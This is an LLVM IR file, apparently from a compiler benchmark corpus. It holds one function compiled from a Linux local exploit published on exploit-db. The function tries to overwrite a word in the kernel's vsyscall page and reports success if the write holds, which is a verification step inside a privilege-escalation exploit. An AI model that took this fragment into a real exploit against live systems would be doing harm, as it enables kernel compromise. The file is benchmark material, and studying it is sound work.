; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_modify_vsyscall.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_47170.c_modify_vsyscall.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@VSYSCALL = common dso_local global i64 0, align 8
@SIGSEGV = common dso_local global i32 0, align 4
@SIG_UNBLOCK = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"[-] couldn't set sigmask\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@catch_sigsegv = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"[~] vsyscall page altered!\0A\00", align 1
@verification_result = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @modify_vsyscall(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %6 = load i64, i64* @VSYSCALL, align 8
  %7 = add nsw i64 %6, 2128
  %8 = inttoptr i64 %7 to i64*
  store i64* %8, i64** %3, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = ptrtoint i8* %9 to i64
  store i64 %10, i64* %4, align 8
  %11 = call i32 @sigemptyset(i32* %5)
  %12 = load i32, i32* @SIGSEGV, align 4
  %13 = call i32 @sigaddset(i32* %5, i32 %12)
  %14 = load i32, i32* @SIG_UNBLOCK, align 4
  %15 = call i64 @pthread_sigmask(i32 %14, i32* %5, i32* null)
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %21

17:                                               ; preds = %1
  %18 = call i32 @dprintf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @EXIT_FAILURE, align 4
  %20 = call i32 @exit(i32 %19) #3
  unreachable

21:                                               ; preds = %1
  %22 = load i32, i32* @SIGSEGV, align 4
  %23 = load i32, i32* @catch_sigsegv, align 4
  %24 = call i32 @signal(i32 %22, i32 %23)
  %25 = load i64, i64* %4, align 8
  %26 = add i64 3735928559, %25
  %27 = load i64*, i64** %3, align 8
  store i64 %26, i64* %27, align 8
  %28 = load i64*, i64** %3, align 8
  %29 = load i64, i64* %28, align 8
  %30 = load i64, i64* %4, align 8
  %31 = add i64 3735928559, %30
  %32 = icmp eq i64 %29, %31
  br i1 %32, label %33, label %36

33:                                               ; preds = %21
  %34 = call i32 @dprintf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* @verification_result, align 4
  %35 = call i32 @pthread_exit(i32 0)
  br label %36

36:                                               ; preds = %33, %21
  ret i8* null
}

declare dso_local i32 @sigemptyset(i32*) #1

declare dso_local i32 @sigaddset(i32*, i32) #1

declare dso_local i64 @pthread_sigmask(i32, i32*, i32*) #1

declare dso_local i32 @dprintf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @pthread_exit(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
